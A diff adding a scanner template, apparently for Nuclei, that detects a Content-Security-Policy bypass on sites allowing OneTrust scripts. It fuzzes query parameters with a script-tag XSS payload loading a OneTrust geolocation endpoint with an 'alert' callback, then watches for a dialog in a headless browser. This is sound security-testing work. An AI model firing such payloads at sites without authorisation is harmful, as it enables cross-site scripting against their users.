@@ -1,0 +1,55 @@
+id: onetrust-geolocation-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass - OneTrust Geolocation
+  author: renniepak,DhiyaneshDK
+  severity: medium
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,onetrust-geolocation
+
+flow: http(1) && headless(1)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Content-Security-Policy"
+          - "onetrust.com"
+        condition: and
+        internal: true
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: onetrust_geolocation_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - '<script src="https://geolocation.onetrust.com/cookieconsentpub/v1/geo/location/alert"></script>'
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "onetrust_geolocation_csp_xss == true"
+# digest: 4a0a00473045022100ebe3fe9ca1f05c423771cc05eb24b944693049e49fcfc56971b3ff8ea238891402204091740901c0f10ee4ad72fe06a2cce4384756431f95670570380dbbd5fa7122:922c64590222798bb761d5b6d8e72950
